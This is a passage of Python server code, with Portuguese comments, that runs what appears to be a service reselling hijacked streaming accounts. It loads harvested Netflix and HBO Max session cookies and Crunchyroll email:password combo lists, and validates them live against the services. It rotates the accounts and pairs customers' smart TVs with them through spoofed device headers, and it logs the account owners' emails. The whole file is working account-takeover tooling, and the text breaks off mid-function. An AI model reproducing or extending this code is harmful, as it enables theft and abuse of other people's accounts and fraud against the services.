import os
import re
import json
import glob
import random
import uuid
import base64
import urllib3
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import socketserver
import hmac
import secrets
import threading
import time
import concurrent.futures
from datetime import datetime
from typing import Dict, Optional, Tuple, List, Set
import urllib.parse
import stat
import traceback
import kernel_logger
import gerenciador_seguranca

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurações de Pastas
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
NETFLIX_COOKIES_FOLDER = os.path.join(BASE_DIR, "netflix")
HBO_COOKIES_FOLDER = os.path.join(BASE_DIR, "hbomax")
CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
HITS_FOLDER = os.path.join(BASE_DIR, "hits")
USED_REGISTRY_FILE = os.path.join(BASE_DIR, "used_cookies.json")
COOKIES_BUNDLE_FILE = os.path.join(BASE_DIR, "cookies_bundle.json")
PORT = int(os.environ.get("PORT", 5000))
SERVER_DATA_VERSION = time.time()

def read_secure_text(fpath: str) -> str:
    """Lê um arquivo do cofre de forma segura, descriptografando em tempo real se estiver blindado."""
    if not os.path.exists(fpath):
        return ""
    try:
        with open(fpath, 'rb') as f:
            raw = f.read()
        key = gerenciador_seguranca.get_master_key()
        plain = gerenciador_seguranca.decrypt_bytes(raw, key)
        if plain is not None:
            return plain.decode('utf-8', errors='ignore')
        return raw.decode('utf-8', errors='ignore')
    except Exception:
        return ""

def sync_cookies_bundle():
    """Garante suporte total às pastas netflix, hbomax, combo e hits sem ressuscitar arquivos excluídos."""
    os.makedirs(NETFLIX_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(HITS_FOLDER, exist_ok=True)
    os.makedirs(HBO_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)
    
    old_netflix = os.path.join(BASE_DIR, "cookies")
    old_hbo = os.path.join(BASE_DIR, "cookies 01")
    
    nf_existing = glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.json"))
    if not nf_existing and os.path.exists(old_netflix):
        for f in glob.glob(os.path.join(old_netflix, "*.*")):
            dest = os.path.join(NETFLIX_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    hbo_existing = glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.json"))
    if not hbo_existing and os.path.exists(old_hbo):
        for f in glob.glob(os.path.join(old_hbo, "*.*")):
            dest = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    # 1. Se o bundle existir, restaura as pastas no servidor APENAS se estiverem vazias (ex: deploy frio)
    if os.path.exists(COOKIES_BUNDLE_FILE):
        try:
            bundle_raw = read_secure_text(COOKIES_BUNDLE_FILE)
            if bundle_raw:
                data = json.loads(bundle_raw)
            
                current_nf = glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.json"))
                if not current_nf:
                    for fname, content in data.get("netflix", {}).items():
                        dest = os.path.join(NETFLIX_COOKIES_FOLDER, fname)
                        if not os.path.exists(dest):
                            with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                                out.write(content)
                            
                current_hbo = glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.json"))
                if not current_hbo:
                    for fname, content in data.get("hbo", {}).items():
                        dest = os.path.join(HBO_COOKIES_FOLDER, fname)
                        if not os.path.exists(dest):
                            with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                                out.write(content)

                current_cr = glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt"))
                if not current_cr:
                    for fname, content in data.get("crunchyroll", {}).items():
                        dest = os.path.join(CRUNCHYROLL_COMBO_FOLDER, fname)
                        if not os.path.exists(dest):
                            with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                                out.write(content)
        except Exception:
            pass

    # 2. Salva todos os cookies locais atuais no arquivo único cookies_bundle.json
    bundle = {"netflix": {}, "hbo": {}, "crunchyroll": {}}
    if os.path.exists(NETFLIX_COOKIES_FOLDER):
        for f in glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(NETFLIX_COOKIES_FOLDER, "*.json")):
            try:
                c = read_secure_text(f)
                if c:
                    bundle["netflix"][os.path.basename(f)] = c
            except Exception:
                pass

    if os.path.exists(HBO_COOKIES_FOLDER):
        for f in glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(HBO_COOKIES_FOLDER, "*.json")):
            try:
                c = read_secure_text(f)
                if c:
                    bundle["hbo"][os.path.basename(f)] = c
            except Exception:
                pass

    if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
        for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
            try:
                c = read_secure_text(f)
                if c:
                    bundle["crunchyroll"][os.path.basename(f)] = c
            except Exception:
                pass

    try:
        with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as outf:
            json.dump(bundle, outf)
    except Exception:
        pass

sync_cookies_bundle()

# Cache de cookies e estados em memória
USED_NETFLIX_COOKIES: Set[str] = set()
USED_HBO_COOKIES: Set[str] = set()

# Histórico
history_lock = threading.Lock()

def load_history() -> List[dict]:
    with history_lock:
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        return data
            except Exception:
                pass
        return []

def record_history_entry(service: str, filename: str, email: str, tv_code: str, plan: str = "", status: str = "Sucesso"):
    with history_lock:
        history = []
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        history = data
            except Exception:
                history = []
        
        history.insert(0, {
            "service": service,
            "filename": os.path.basename(filename) if filename else "cookie",
            "email": email,
            "tv_code": tv_code,
            "plan": plan,
            "status": status,
            "used_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        })

        try:
            with open(USED_REGISTRY_FILE, 'w', encoding='utf-8') as f:
                json.dump(history, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO NETFLIX (MOTOR PROVADO TV2.PY COM VALIDAÇÃO REAL)
# ═══════════════════════════════════════════════════════════════
import tv2

USED_NETFLIX_COOKIES = tv2.USED_COOKIES
ACTIVE_PLAN = {"netflix": "TODOS", "hbo": "TODOS", "crunchyroll": "TODOS", "sky": "TODOS"}

# Cache de cookies testados e validados ao vivo
VALID_NETFLIX_LOCK = threading.Lock()
VALID_NETFLIX_BY_FILE: Dict[str, dict] = {}
VALID_NETFLIX_POOL: List[dict] = []
DEAD_NETFLIX_COOKIES: Set[str] = set()
COOKIE_FAIL_COUNTS: Dict[str, int] = {}

# HBO Valid Pool
VALID_HBO_LOCK = threading.Lock()
VALID_HBO_BY_FILE: Dict[str, dict] = {}
VALID_HBO_POOL: List[dict] = []

def get_netflix_files() -> List[str]:
    return tv2.get_available_cookie_files()

def get_all_netflix_files_raw() -> List[str]:
    """Retorna TODOS os arquivos da pasta netflix/ sem filtrar por DEAD_COOKIES."""
    import glob as _glob
    base_d = os.path.dirname(os.path.abspath(__file__))
    folders = [os.path.join(base_d, "netflix"), os.path.join(base_d, "cookies")]
    all_files = []
    seen_names = set()
    for fold in folders:
        if os.path.exists(fold):
            for ext in ["*.txt", "*.json"]:
                for f in _glob.glob(os.path.join(fold, ext)):
                    bname = os.path.basename(f)
                    if bname not in seen_names:
                        seen_names.add(bname)
                        all_files.append(os.path.abspath(f))
    return all_files

def classify_plan(filename: str, plan_text: str = "") -> str:
    combined = f"{filename} {plan_text}".lower()
    if any(k in combined for k in ['premium', 'cao cấp', 'uhd', '4k', 'vip', 'مميزة']):
        return 'PREMIUM'
    elif any(k in combined for k in ['com anúncio', 'with ads', 'with advert', 'avec pub', 'mit werbung', 'con anuncios', 'con pubblicità', 'reklam']):
        return 'COM ANÚNCIOS'
    elif any(k in combined for k in ['padrão', 'standard', 'estándar', 'standart', 'tiêu chuẩn', 'fhd', '1080', 'giá chuẩn', 'standardowy', 'قياسية', 'סטנדרטית']):
        return 'PADRÃO'
    elif any(k in combined for k in ['básico', 'basic', 'basis', 'dasar', 'essentiel', 'mobile', 'podstawowy', 'أساسية']):
        return 'BÁSICO'
    return 'PADRÃO'

def test_netflix_cookie_file(fpath: str, timeout: float = 4.0) -> Optional[dict]:
    """Testa se o arquivo de cookie possui sessão real ativa na Netflix."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or fpath in tv2.DEAD_COOKIES:
        return None

    with VALID_NETFLIX_LOCK:
        if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
            return VALID_NETFLIX_BY_FILE[fpath]

    try:
        raw = read_secure_text(fpath)
        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            DEAD_NETFLIX_COOKIES.add(fpath)
            tv2.DEAD_COOKIES.add(fpath)
            return None

        # Validação real contra os servidores da Netflix
        acc_info = tv2.check_account(parsed, timeout=timeout)
        if not acc_info:
            # Tolerância contra rate-limit transitório de rede: não descarta sumariamente no primeiro erro
            COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
            if COOKIE_FAIL_COUNTS[fpath] >= 3:
                DEAD_NETFLIX_COOKIES.add(fpath)
                tv2.DEAD_COOKIES.add(fpath)
            return None

        COOKIE_FAIL_COUNTS[fpath] = 0
        cat = classify_plan(bname, acc_info.get("plan", ""))
        acc_info["category"] = cat

        entry = {
            "file": fpath,
            "parsed": parsed,
            "info": acc_info,
            "validated": True
        }

        with VALID_NETFLIX_LOCK:
            VALID_NETFLIX_BY_FILE[fpath] = entry
            if not any(e["file"] == fpath for e in VALID_NETFLIX_POOL):
                VALID_NETFLIX_POOL.append(entry)

        return entry
    except Exception:
        COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
        if COOKIE_FAIL_COUNTS[fpath] >= 3:
            DEAD_NETFLIX_COOKIES.add(fpath)
            tv2.DEAD_COOKIES.add(fpath)
        return None

def extract_netflix_file_info(fpath: str) -> Optional[dict]:
    """Extrai informações do arquivo de cookie (email, plano, país) sem travar a requisição com rede."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or fpath in tv2.DEAD_COOKIES:
        return None

    try:
        raw = read_secure_text(fpath)
        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            return None

        email = ""
        country = "BR"
        plan = "PREMIUM"

        # 1. Regex no nome do arquivo: [BR] [email@domain.com] - Plano.txt
        fn_match = re.search(r'\[([A-Za-z]{2})\]\s*\[([^\]]+)\]\s*-\s*([^.]+)', bname)
        if fn_match:
            country = fn_match.group(1).upper()
            email = fn_match.group(2).strip()
            plan = fn_match.group(3).strip()

        # 2. Regex no conteúdo do arquivo caso o nome não tenha
        if not email:
            em_match = re.search(r'(?:📧|\bEmail\b)[\s:]*([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw, re.I)
            if em_match:
                email = em_match.group(1).strip()

        if not email:
            any_em = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw)
            if any_em:
                email = any_em.group(1).strip()
            else:
                email = bname.replace('.txt', '').replace('.json', '')

        if country == "BR":
            c_match = re.search(r'(?:🌍|\bPais\b)[\s:]*.*?\(([A-Z]{2})\)', raw, re.I)
            if c_match:
                country = c_match.group(1).upper()
            else:
                c2_match = re.search(r'Country:\s*([A-Z]{2})', raw, re.I)
                if c2_match:
                    country = c2_match.group(1).upper()

        if plan == "PREMIUM" or not plan:
            p_match = re.search(r'(?:📋|\bPlano\b)[\s:]*([^\r\n]+)', raw, re.I)
            if p_match:
                plan = p_match.group(1).strip()

        cat = classify_plan(bname, plan)

        return {
            "file": fpath,
            "parsed": parsed,
            "info": {
                "email": email,
                "country": country,
                "plan": plan,
                "category": cat
            },
            "validated": False
        }
    except Exception:
        return None

def get_all_netflix_accounts() -> List[dict]:
    """Retorna todas as contas Netflix disponíveis da pasta (deduplicadas), com metadados instantâneos.
    Usa get_all_netflix_files_raw() para não ser zerado por DEAD_COOKIES de rede."""
    # Usa arquivos físicos brutos para não ser afetado por falhas de rede temporárias
    files = get_all_netflix_files_raw()
    accounts = []
    seen_names = set()

    for fpath in files:
        bname = os.path.basename(fpath)
        if bname in seen_names:
            continue
        seen_names.add(bname)

        # Ignora apenas cookies confirmadamente mortos pela validação ao vivo (não por timeout)
        if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES:
            continue

        # Se já tiver validação ao vivo salva em cache
        with VALID_NETFLIX_LOCK:
            if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
                accounts.append(VALID_NETFLIX_BY_FILE[fpath])
                continue

        # Extração instantânea de metadados (sem requisição HTTP)
        meta = extract_netflix_file_info(fpath)
        if meta:
            accounts.append(meta)

    return accounts

def start_background_netflix_validator():
    """Valida em segundo plano os cookies restantes da pasta de forma suave sem derrubar conexões."""
    def _worker():
        time.sleep(15)
        while True:
            files = get_netflix_files()
            for f in files:
                bname = os.path.basename(f)
                if f in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or f in tv2.DEAD_COOKIES:
                    continue
                with VALID_NETFLIX_LOCK:
                    if f in VALID_NETFLIX_BY_FILE:
                        continue
                try:
                    test_netflix_cookie_file(f, timeout=3.5)
                except Exception:
                    pass
                time.sleep(3.0)
            time.sleep(180)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_netflix_validator()

def get_verified_netflix_cookies(min_count: int = 1) -> List[dict]:
    """Retorna todas as contas Netflix disponíveis."""
    return get_all_netflix_accounts()

def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = "", exclude_email: str = "") -> Optional[dict]:
    """Retorna o próximo cookie Netflix 100% verificado usando seleção aleatória e anti-repetição de tv2.py."""
    if exclude_file:
        tv2.mark_cookie_used(exclude_file, exclude_email)
    elif exclude_email:
        tv2.LAST_USED_AT[exclude_email.lower()] = time.time()

    cookie_data = tv2.find_next_valid_cookie(exclude_file=exclude_file, exclude_email=exclude_email)
    if cookie_data:
        f = cookie_data.get("file", "")
        with VALID_NETFLIX_LOCK:
            VALID_NETFLIX_BY_FILE[f] = cookie_data
        return cookie_data
    return None

# Alias de compatibilidade
find_netflix_fast_cookie = find_netflix_valid_cookie

def select_netflix_cookie_by_filename(filename: str) -> Optional[dict]:
    """Seleciona e valida especificamente o arquivo de cookie indicado."""
    if not filename:
        return find_netflix_valid_cookie()
    bname = os.path.basename(filename).strip().lower()
    for f in get_netflix_files():
        if os.path.basename(f).lower() == bname or f.lower() == filename.lower():
            tested = test_netflix_cookie_file(f, timeout=5.0)
            if tested:
                return tested
            meta = extract_netflix_file_info(f)
            if meta:
                return meta
    return None

def activate_netflix_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Executa a ativação da Smart TV Netflix utilizando o fluxo comprovado de tv2.py com rotação circular."""
    return tv2.activate_with_cookie(cookie_data, tv_code)




# ═══════════════════════════════════════════════════════════════
#  LÓGICA HBO MAX
# ═══════════════════════════════════════════════════════════════
HBO_ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

COUNTRY_MAP = {
    "TR": "Turquia", "US": "Estados Unidos", "IN": "Índia",
    "GB": "Reino Unido", "FR": "França", "DE": "Alemanha",
    "ES": "Espanha", "IT": "Itália", "BR": "Brasil",
    "MX": "México", "AR": "Argentina", "CA": "Canadá",
    "AU": "Austrália", "JP": "Japão", "KR": "Coreia do Sul",
    "TH": "Tailândia", "PL": "Polônia", "CL": "Chile",
    "CO": "Colômbia", "PE": "Peru", "UY": "Uruguai"
}

def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        return None
    except Exception:
        return None

def extract_hbo_st_token(content: str) -> Optional[str]:
    match = re.search(r'^st:\s*(eyJ[A-Za-z0-9_\-\.]+)', content, re.MULTILINE)
    if match:
        return match.group(1)
    match = re.search(r'st=([^;\s]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    match = re.search(r'(eyJ[A-Za-z0-9_\-\.]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    return None

def get_hbo_region_from_jwt(st_token: str) -> str:
    decoded = decode_jwt(st_token)
    if decoded:
        sub = decoded.get('subdivision', '')
        if 'amer' in sub:
            return 'amer'
        elif 'emea' in sub:
            return 'emea'
        elif 'latam' in sub:
            return 'latam'
        elif 'apac' in sub:
            return 'apac'
    return 'amer'

HBO_LAST_USED_AT: Dict[str, float] = {}
DEAD_HBO_COOKIES: Set[str] = set()
USED_HBO_COOKIES: Set[str] = set()

def get_hbo_files() -> List[str]:
    files = []
    seen_names = set()
    for h_dir in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
        if os.path.exists(h_dir):
            for ext in ["*.txt", "*.json"]:
                for f in glob.glob(os.path.join(h_dir, ext)):
                    bname = os.path.basename(f)
                    if bname not in seen_names:
                        seen_names.add(bname)
                        files.append(os.path.abspath(f))

    # Exclui arquivos com sessão morta
    valid_files = [f for f in files if f not in DEAD_HBO_COOKIES and os.path.basename(f) not in DEAD_HBO_COOKIES]
    # Rotação circular LRU (menos recentemente usado primeiro)
    valid_files.sort(key=lambda f: (
        0 if "_br_" in os.path.basename(f).lower() else 1,
        HBO_LAST_USED_AT.get(f, HBO_LAST_USED_AT.get(os.path.basename(f), 0.0))
    ))
    return valid_files

def extract_hbo_file_info(filename: str) -> Optional[dict]:
    if not os.path.exists(filename):
        return None
    bname = os.path.basename(filename)
    if filename in DEAD_HBO_COOKIES or bname in DEAD_HBO_COOKIES:
        return None
    try:
        content = read_secure_text(filename)
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None
        decoded = decode_jwt(st_token)
        if decoded:
            exp = decoded.get('exp', 0)
            if exp and datetime.fromtimestamp(exp) < datetime.now():
                DEAD_HBO_COOKIES.add(filename)
                DEAD_HBO_COOKIES.add(bname)
                return None
        region = get_hbo_region_from_jwt(st_token)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        return {
            "file": filename,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            },
            "validated": False
        }
    except Exception:
        return None

def get_hbo_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    try:
        res = requests.get(url, headers=headers, timeout=4, verify=False)
        if res.status_code == 200:
            return res.json()
        return None
    except Exception:
        return None

def is_hbo_free(user_data: Dict) -> bool:
    if not user_data or 'data' not in user_data:
        return True
    attrs = user_data.get('data', {}).get('attributes', {})
    if attrs.get('isFree') is True or attrs.get('isTrial') is True:
        return True
    sub_status = str(attrs.get('subscriptionStatus', '') or attrs.get('status', '') or attrs.get('accountStatus', '') or attrs.get('billingStatus', '')).lower()
    if sub_status in ['expired', 'inactive', 'canceled', 'cancelled', 'unsubscribed', 'suspended', 'past_due', 'pastdue', 'billing_issue', 'grace_period', 'hold', 'payment_failed']:
        return True
    if attrs.get('hasActiveSubscription') is False:
        return True
    return False

def get_all_hbo_accounts() -> List[dict]:
    """Retorna todas as contas HBO Max disponíveis da pasta, deduplicadas."""
    files = get_hbo_files()
    accounts = []
    seen = set()
    for filename in files:
        bname = os.path.basename(filename)
        if bname in seen:
            continue
        seen.add(bname)
        if filename in DEAD_HBO_COOKIES or bname in DEAD_HBO_COOKIES:
            continue
        with VALID_HBO_LOCK:
            if filename in VALID_HBO_BY_FILE:
                accounts.append(VALID_HBO_BY_FILE[filename])
                continue
        meta = extract_hbo_file_info(filename)
        if meta:
            accounts.append(meta)
    return accounts

def get_verified_hbo_cookies(min_count: int = 1) -> List[dict]:
    """Retorna a lista de contas HBO Max disponíveis."""
    return get_all_hbo_accounts()

def find_hbo_valid_cookie() -> Optional[dict]:
    all_hbo = get_all_hbo_accounts()
    if not all_hbo:
        return None
    return random.choice(all_hbo)

def activate_hbo_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    clean_code = re.sub(r'[^0-9]', '', tv_code)
    if len(clean_code) != 6:
        return False, "O código HBO Max deve conter exatamente 6 dígitos numéricos (ex: 123456).", None

    if not cookie_data:
        return False, "Nenhum cookie HBO Max selecionado.", None

    st_token = cookie_data["st_token"]
    region = cookie_data["region"]
    filename = cookie_data["file"]

    device_id = str(uuid.uuid4())
    device_info = {
        "deviceId": device_id,
        "deviceName": "Chrome",
        "deviceModel": "Windows",
        "deviceType": "BROWSER",
        "osVersion": "10.0.0",
        "appVersion": "7.4.0",
        "manufacturer": "Google",
        "screenWidth": 1920,
        "screenHeight": 1080,
        "language": "pt-BR",
        "timezone": "America/Sao_Paulo"
    }
    device_info_b64 = base64.b64encode(json.dumps(device_info).encode()).decode()
    client_id = f"web_{uuid.uuid4().hex[:16]}"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId={client_id}",
        "x-disco-device-info": device_info_b64,
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "pt-BR,pt",
        "x-wbd-time-zone": "America/Sao_Paulo",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    payload = {"linkingCode": clean_code}
    try:
        val_url = HBO_ENDPOINTS[region]["validate"]
        con_url = HBO_ENDPOINTS[region]["connect"]
        r1 = requests.post(val_url, headers=headers, json=payload, timeout=6, verify=False)
        if r1.status_code in [200, 204]:
            r2 = requests.post(con_url, headers=headers, json=payload, timeout=6, verify=False)
            if r2.status_code in [200, 204]:
                now_ts = time.time()
                HBO_LAST_USED_AT[filename] = now_ts
                HBO_LAST_USED_AT[os.path.basename(filename)] = now_ts
                record_history_entry("HBO Max", filename, cookie_data["info"]["email"], clean_code, cookie_data["info"]["plan"], "Sucesso")
                return True, "TV pareada e ativada com sucesso na HBO Max!", cookie_data["info"]
            else:
                DEAD_HBO_COOKIES.add(filename)
                return False, "Falha na etapa de conexão final com a TV na HBO Max.", None
        else:
            if r1.status_code == 400:
                try:
                    err = r1.json()
                    err_code = err.get('errors', [{}])[0].get('code', '')
                    if err_code == 'invalid.code':
                        return False, f"O código '{clean_code}' é inválido. Digite o código exibido na TV.", None
                    elif err_code == 'expired.code':
                        return False, f"O código '{clean_code}' expirou na TV. Gere um novo código de 6 dígitos.", None
                except Exception:
                    pass
            DEAD_HBO_COOKIES.add(filename)
            return False, "A sessão deste cookie HBO Max expirou. Próximo cookie pronto!", None
    except Exception as e:
        DEAD_HBO_COOKIES.add(filename)
        return False, f"Erro de conexão com os servidores da HBO Max: {str(e)}", None

def select_hbo_cookie_by_filename(filename: str) -> Optional[dict]:
    fpath = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(filename))
    if not os.path.exists(fpath):
        return None
    try:
        content = read_secure_text(fpath)
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None

        bname = os.path.basename(fpath)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        region = get_hbo_region_from_jwt(st_token)

        user_data = get_hbo_user_info(st_token, region)
        if user_data:
            attrs = user_data.get('data', {}).get('attributes', {})
            real_email = attrs.get('username', '') or attrs.get('email', '')
            if real_email:
                email = real_email
            raw_country = attrs.get('verifiedHomeTerritory', country)
            country = COUNTRY_MAP.get(raw_country, raw_country)
            tier = attrs.get('tier', '') or attrs.get('productType', '') or "PREMIUM"
            plan = f"HBO Max {tier.upper()}"

        return {
            "file": fpath,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            }
        }
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO CRUNCHYROLL (MOTOR COMBO & TV ACTIVATION REAL)
# ═══════════════════════════════════════════════════════════════
import crunchyroll

CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)

VALID_CRUNCHYROLL_LOCK = threading.Lock()
VALID_CRUNCHYROLL_BY_EMAIL: Dict[str, dict] = {}
VALID_CRUNCHYROLL_POOL: List[dict] = []
CR_LAST_USED_AT: Dict[str, float] = {}
DEAD_CRUNCHYROLL_ACCOUNTS: Set[str] = set()
USED_CRUNCHYROLL_ACCOUNTS: Set[str] = set()

def get_all_crunchyroll_accounts() -> List[dict]:
    """Retorna todas as contas Crunchyroll dos combos com metadados rápidos e ordenação por rotação LRU."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    combos.sort(key=lambda item: CR_LAST_USED_AT.get(item[0], 0.0))
    accounts = []
    seen = set()

    for email, pwd, fname in combos:
        if email in seen:
            continue
        seen.add(email)

        if email in DEAD_CRUNCHYROLL_ACCOUNTS:
            continue

        with VALID_CRUNCHYROLL_LOCK:
            if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
                accounts.append(VALID_CRUNCHYROLL_BY_EMAIL[email])
                continue

        accounts.append({
            "file": fname,
            "email": email,
            "password": pwd,
            "info": {
                "email": email,
                "plan": "Crunchyroll VIP",
                "country": "BR"
            },
            "validated": False
        })
    return accounts

def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]:
    """Valida ao vivo uma conta Crunchyroll nos servidores oficiais."""
    if email in DEAD_CRUNCHYROLL_ACCOUNTS:
        return None

    with VALID_CRUNCHYROLL_LOCK:
        if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
            entry = VALID_CRUNCHYROLL_BY_EMAIL[email]
            if entry.get("exp", 0) > time.time() + 120:
                return entry

    session = crunchyroll.make_session()
    try:
        res = crunchyroll.check_account(session, email, pwd)
        status = res.get("status")

        if status in ["premium", "free"]:
            entry = {
                "file": fname,
                "email": email,
                "password": pwd,
                "access_token": res.get("access_token"),
                "exp": res.get("exp", int(time.time() + 3600)),
                "info": {
                    "email": email,
                    "plan": res.get("plan", "Crunchyroll VIP"),
                    "country": res.get("country", "BR"),
                    "benefits": res.get("benefits", [])
                },
                "validated": True
            }
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL[email] = entry
                found = False
